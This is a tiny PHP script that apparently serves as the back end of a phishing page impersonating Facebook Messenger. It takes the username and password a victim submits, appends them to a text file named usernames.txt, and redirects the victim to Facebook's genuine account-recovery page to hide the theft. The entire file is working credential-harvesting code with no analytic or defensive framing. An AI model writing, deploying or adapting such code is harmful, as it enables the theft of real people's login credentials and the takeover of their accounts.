<?php

file_put_contents("usernames.txt", "Messenger Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.facebook.com/recover/initiate/');
exit();
?>